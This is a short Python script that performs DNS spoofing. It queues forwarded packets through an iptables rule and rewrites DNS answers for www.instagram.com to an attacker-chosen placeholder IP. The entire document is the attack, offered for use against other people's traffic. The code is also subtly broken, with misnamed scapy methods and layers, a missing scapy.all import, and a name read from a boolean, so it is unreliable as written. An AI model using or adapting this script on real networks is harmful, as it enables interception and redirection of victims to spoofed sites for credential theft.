#Execute this bash before running code
#iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy

def process_packet(packet):
    scapy_packet =  scapy.IP(packet.get_payload())
    if scapy_packet.hasLayer(scapy.DNSRR):
        qname = scapy_packet.hasLayer(scapy.DNSRQ).qname
        if "www.instagram.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="//spoofing ip")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum 

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()